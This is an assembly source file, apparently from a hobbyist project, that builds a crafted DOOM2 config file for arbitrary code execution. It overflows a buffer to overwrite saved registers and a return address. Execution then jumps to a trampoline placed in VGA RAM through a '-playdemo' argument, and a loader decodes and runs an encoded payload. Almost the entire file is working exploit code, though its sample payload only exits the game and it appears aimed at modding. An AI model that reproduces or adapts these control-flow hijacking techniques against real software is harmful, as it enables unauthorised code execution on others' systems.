//// kgsws' DOOM2 ACE engine
//////////////////////////////
// This file contains config file exploit. The file alone is not enough to execute this exploit.
// There must be a special trampoline code at specific address, in video RAM.

#define TEXT_START	0x1F5B20

.section .text
.globl _start

_start:
	// this is the name of resulting binary
	.ascii	"-config ACE\n"

	// This contains a trampoline code that will be placed in VGA RAM.
	// This code is placed into VGA RAM using 'printf' so it is very limited.
	// Every second byte is 0x07 - character attributes (gray text on black background).
	//	eax = 0xb6	this is forced by the code
	//	edi = 0xb815d
	//	edx = 0xf8cc
	//	ecx = 0xb811e
	//   b815a:	29 07                	sub    %eax,(%edi)
	//   b815c:	31 51 41 (31 07 42)  	xor    %edx,0x41(%ecx)
	//   b815f:	FF E4 (07 28)
	// no demo is actually played
	.ascii	"-playdemo )1B(\n"

	// dummy config option name + separator
	.ascii	"haax\t"

	//// this part has to contain exact number of any characters except NEWLINE or EOF

	// credits
	.ascii	"++++++++++++++++"
	.ascii	"+..Arbitrary...+"
	.ascii	"+.....code.....+"
	.ascii	"+...execution..+"
	.ascii	"+..............+"
	.ascii	"+.....for......+"
	.ascii	"+....DOOM.2....+"
	.ascii	"+..............+"
	.ascii	"+...by.kgsws...+"
	.ascii	"++++++++++++++++"
	.ascii	"\\______________/"

	// filler
	.ascii	"........"

	// this has to point to RW memory, anywhere
	.4byte	0x000b8030

	// filler stuff
	.4byte	0x20202020

	// value of EDI
	.4byte	0x000b815d

	// filler stuff
	.4byte	0x20202020

	// value of EDX
	.4byte	0x0000ccf8

	// value of ECX
	.4byte	0x000b811e

	// filler stuff
	.4byte	0x20202020

	// the exploit - address to jump at
	.4byte	0x000b815a

	//// end of length critical part 

	// executable code
	// this code is jumped to from VGA RAM trampoline
	// there must be no opcodes that translate to NEWLINE or EOF
code_start:

	// recover base pointer
	mov	-232(%esp),%esi

	// recover DATA pointer
	mov	5(%esi),%edi
	sub	$0x2b6e4,%edi	// EDI contains DATA base

	// recover CODE pointer
	sub	$0x24540,%esi	// ESI contains CODE base

	// check EXE version
	mov	0x1fd1c(%edi),%eax
	cmp	$0x78257830,%eax
	je	progress

	// decode error message
	mov	$(error_end-error_txt)/4,%edx
	lea	error_txt-code_start(%esp),%ebx
	mov	%ebx,%ecx
eloop:
	call	decode
	dec	%edx
	jnz	eloop

	// print error
	xor	%ebx,%ebx
	mov	$((error_end-error_txt)/4)*3,%ecx
	lea	error_txt-code_start(%esp),%edx
	mov	$0x4000,%ax
	int	$0x21

	// exit
	mov	$0x4c01,%ax
	int	$0x21

	// locate 'myargv'
progress:
	mov	0x2b6f4(%edi),%eax

	// index to loaded response file (this file)
	mov	4(%eax),%eax

	// start at 'code' offset
	lea	code-_start(%eax),%ebx
	mov	%ebx,%ecx

	// decode page count
	call	decode
	movzw	-3(%ecx),%edx

	// decode the data
loop:
	call	decode
	dec	%edx
	jnz	loop

	// load start of 'code' again
	mov	0x2b6f4(%edi),%eax
	mov	4(%eax),%eax
	lea	code-_start+3(%eax),%eax

	// and jump there
	jmp	*%eax

	// decoder
decode:
	// converts processed 4 bytes into raw 3 bytes
	// ebx = source
	// ecx = destination
	mov	(%ebx),%ebp
	and	$0x007F7F7F,%ebp
	movzb	3(%ebx),%eax
	and	$0x7F,%al
	imul	$2113664,%eax	// magic; expands 3 LSBs of one byte into MSBs of 3 bytes
	and	$0x00808080,%eax // but it needs a cleanup
	or	%ebp,%eax
	mov	%al,(%ecx)
	inc	%ecx
	shr	$8,%eax
	mov	%ax,(%ecx)
	inc	%ecx
	inc	%ecx
	add	$4,%ebx
	ret

	// error message
	// processed to hide the text to avoid confusion
error_txt:
	.4byte	0x80f3eed5
	.4byte	0x80f0f0f5
	.4byte	0x80f4f2ef
	.4byte	0x80a0e4e5
	.4byte	0x80cfcfc4
	.4byte	0x80f6a0cd
	.4byte	0x80f3f2e5
	.4byte	0x80eeefe9
	.4byte	0x808a8da1
error_end:

	// EOF marker
	.byte	0x1a

	// processed code follows this mark
	// this mark is expected to exist by second stage
	.ascii "HAX "
code:

	// example code: exit game
//	.4byte	0x80808082
//	.4byte	0x8280B8E6
//	.4byte	0x82A1CDCC

